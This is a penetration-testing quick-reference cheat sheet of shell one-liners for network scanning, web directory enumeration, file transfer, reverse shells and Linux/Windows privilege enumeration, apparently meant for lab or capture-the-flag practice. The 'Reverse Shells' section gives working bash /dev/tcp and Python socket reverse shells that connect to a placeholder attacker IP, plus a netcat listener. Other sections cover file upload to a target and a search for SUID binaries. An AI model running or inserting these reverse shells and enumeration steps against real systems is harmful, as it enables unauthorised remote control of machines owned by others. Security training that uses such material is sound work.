## 📋 Quick Reference Commands

### One-Liners for Quick Wins

#### Network Discovery
```bash
# Quick network scan
nmap -sn 192.168.1.0/24

# Fast port scan
nmap --top-ports 1000 --open <target>

# Service detection
nmap -sV --version-intensity 9 -p <ports> <target>
```

#### Web Enumeration
```bash
# Quick directory scan
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html

# Technology detection
whatweb http://<target>

# Certificate information
openssl s_client -connect <target>:443 2>/dev/null | openssl x509 -noout -text
```

#### File Transfers
```bash
# HTTP server
python3 -m http.server 8000

# Download file
wget http://<server>/file -O /tmp/file
curl http://<server>/file -o /tmp/file

# Upload file (if upload functionality exists)
curl -F "file=@/path/to/file" http://<target>/upload.php
```

#### Reverse Shells
```bash
# Listener
nc -nvlp 4444

# Basic bash reverse shell
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Platform-Specific Quick Commands

#### Linux Enumeration
```bash
# System info
uname -a && cat /etc/os-release

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Network connections
ss -tulpn

# Processes
ps aux --forest
```

#### Windows Enumeration
```cmd
# System info
systeminfo

# User info
whoami /all

# Network connections
netstat -ano

# Services
sc query

# Scheduled tasks
schtasks /query /fo LIST /v
```

---

